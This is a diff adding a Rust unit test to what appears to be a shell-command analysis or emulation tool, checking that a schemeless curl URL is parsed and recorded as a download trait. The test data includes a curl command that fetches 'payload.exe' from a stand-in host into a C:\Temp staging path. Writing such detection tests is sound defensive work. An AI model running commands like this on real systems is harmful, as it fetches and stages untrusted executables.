@@ -6627,6 +6627,32 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_schemeless_domain_path_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.exe curl-schemeless.example/payload.exe"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "http://curl-schemeless.example/payload.exe",
+                Some(r#"C:\Temp\stage.exe"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_data_payload_does_not_become_download_src() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
